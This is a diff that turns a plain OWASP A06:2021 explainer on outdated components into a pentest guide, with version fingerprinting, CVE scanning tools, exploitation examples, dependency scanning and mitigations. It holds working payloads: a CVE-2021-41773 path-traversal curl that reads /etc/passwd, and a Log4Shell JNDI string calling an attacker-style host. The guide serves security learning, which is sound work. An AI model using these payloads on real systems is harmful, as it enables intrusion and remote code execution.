@@ -1,22 +1,80 @@
-# Vulnerable and Outdated Components
-Vulnerable and Outdated Components refer to security risks associated with using outdated or insecure third-party software or libraries in a web application. It's like using old, unreliable building materials when constructing a house – it weakens the overall structure and increases the risk of issues.
+# Vulnerable and Outdated Components (A06:2021)
 
+Modern apps are mostly other people's code - frameworks, libraries, plugins, container base images, OS packages. When any of those has a known vulnerability (a published CVE) and you haven't patched it, attackers have a ready-made exploit. This is one of the easiest categories to exploit because the research is already done - just match a version to a public PoC.
 
-## What are Vulnerable and Outdated Components? 
-In the context of web applications, components include things like software libraries, frameworks, plugins, or modules that developers use to build their applications. If these components are outdated or have known security vulnerabilities, they can be exploited by attackers.
+Famous examples: **Log4Shell** (Log4j), **Struts** (Equifax breach), **Heartbleed** (OpenSSL), **Spring4Shell**.
 
-## Common Issues with Vulnerable and Outdated Components
+## Step 1 - Fingerprint versions
 
-- Unpatched Software: It's like using an old version of a lock on your front door that has a known flaw. If developers don't update components with security patches, attackers can exploit these known vulnerabilities.
+```bash
+# Web tech + versions
+whatweb https://target.tld
+wappalyzer / builtwith (browser)
 
-- Using Deprecated or Unsupported Libraries: If a developer continues to use a library that is no longer maintained or supported, it's like relying on a tool that's broken and won't be fixed. This can lead to unaddressed security issues.
+# Headers, error pages, and JS bundles often leak versions
+curl -sI https://target.tld           # Server:, X-Powered-By:
+# e.g. jquery-3.1.0.min.js, /wp-includes/ (WordPress), Apache/2.4.49
+```
 
-- Lack of Monitoring for Component Security: It's like not having a security camera to monitor your property. Without proper monitoring, you may not be aware of vulnerabilities in the components you're using.
+## Step 2 - Map versions to known CVEs
 
-## Why are Vulnerable and Outdated Components a Problem? 
-Attackers actively look for vulnerabilities in commonly used components because exploiting them can provide a quick way to compromise multiple applications. It's like targeting all houses with a particular type of lock vulnerability. If one component is vulnerable, it can serve as a gateway for attackers to exploit other parts of the application.
+```bash
+# Templated CVE scanning
+nuclei -u https://target.tld -t http/cves/
 
-## Preventing Issues with Vulnerable and Outdated Components 
-Regularly updating components, using only well-maintained libraries, and monitoring for security vulnerabilities are key preventive measures. Developers should also be aware of the libraries they use, staying informed about any security advisories or updates.
+# CMS-specific
+wpscan --url https://target.tld --enumerate vp   # WordPress plugins/themes
+droopescan scan drupal -u https://target.tld
 
-Vulnerable and Outdated Components is part of the OWASP Top 10 because it highlights the importance of keeping software components up-to-date and secure. Just as you wouldn't want to use outdated or faulty materials in building a house, developers need to ensure that the components they use are reliable, well-maintained, and free from known vulnerabilities to enhance the overall security of their applications.
+# Network services
+nmap -sV --script vulners target.tld
+
+# Search for exploits
+searchsploit apache 2.4.49
+```
+
+## Step 3 - Exploit (in scope)
+
+Example - Apache 2.4.49 path traversal / RCE (CVE-2021-41773):
+
+```bash
+curl "https://target.tld/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" --path-as-is
+```
+
+Log4Shell (CVE-2021-44228) - inject a JNDI lookup into any logged field:
+
+```text
+${jndi:ldap://attacker.oastify.com/a}     # in User-Agent, username, etc.
+```
+
+## Dependency scanning (defender / DevSecOps side)
+
+```bash
+npm audit                     # Node.js
+pip-audit                     # Python
+osv-scanner -r .              # multi-ecosystem
+trivy image myapp:latest      # container image CVEs
+grype dir:.                   # SBOM/dep scanning
+```
+
+## Tools
+
+- [nuclei](https://github.com/projectdiscovery/nuclei), [nmap vulners](https://github.com/vulnersCom/nmap-vulners)
+- [searchsploit / Exploit-DB](https://www.exploit-db.com/), [WPScan](https://wpscan.com/)
+- [Trivy](https://github.com/aquasecurity/trivy), [Grype](https://github.com/anchore/grype), [OSV-Scanner](https://github.com/google/osv-scanner)
+
+## Mitigation - the fix
+
+- Maintain an **inventory / SBOM** of all components and versions.
+- **Patch promptly**; subscribe to CVE feeds and vendor advisories.
+- Remove unused dependencies and features (smaller attack surface).
+- Automate **dependency + container scanning** in CI, and fail builds on criticals.
+- Prefer maintained libraries; pin and verify versions.
+
+## Practice
+
+- VulHub (reproducible vulnerable component labs), TryHackMe rooms
+
+## Reference
+
+- [OWASP A06:2021](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
